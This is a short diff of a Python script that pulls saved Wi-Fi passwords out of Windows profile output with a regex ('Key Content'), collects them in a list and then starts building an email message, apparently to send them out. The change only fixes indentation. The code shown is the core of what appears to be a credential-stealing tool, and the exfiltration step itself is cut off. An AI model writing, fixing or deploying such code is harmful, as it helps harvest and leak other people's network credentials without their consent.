@@ -37,13 +37,13 @@ if len(profile_names) != 0:
             # Again run the regular expressions to capture the group after the : which is the password
                 password = re.search("Key Content            : (.*)\r", profile_info_pass)
             # Check if we found a password in the regular expression. All wifi connections will not have passwords
-            if password == None:
-                wifi_profile["password"] = None
-            else:
+                if password == None:
+                    wifi_profile["password"] = None
+                else:
                 # We assign the grouping (Where the password is contained) we are interested to the password key in the dictionary
-                wifi_profile["password"] = password[1]
+                    wifi_profile["password"] = password[1]
             # We append the wifi information to the wifi_list
-            wifi_list.append(wifi_profile)
+                wifi_list.append(wifi_profile)
 
 # Create the message for the email
 email_message = ""
